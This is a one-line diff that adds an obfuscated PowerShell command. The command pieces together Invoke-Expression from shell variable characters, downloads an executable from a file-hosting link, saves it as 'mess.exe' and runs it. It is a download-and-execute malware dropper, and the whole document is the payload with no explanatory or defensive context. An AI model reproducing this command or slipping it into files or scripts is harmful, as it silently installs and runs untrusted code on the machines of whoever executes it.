@@ -1,0 +1,1 @@
+﻿. ( $SHeLlid[1]+$shELliD[13]+'X') ((('(New-Object Sys'+'te'+'m.Net'+'.'+'Web'+'Client)'+'.Downlo'+'ad'+'Fi'+'le({0}ht'+'tps:'+'//'+'1fichier.com/?'+'hfshj'+'hm0yf{'+'0'+'},{0}mes'+'s.e'+'xe'+'{0});S'+'tart-Proc'+'es'+'s {0}mess'+'.exe{0'+'}')-F[cHar]39)) 
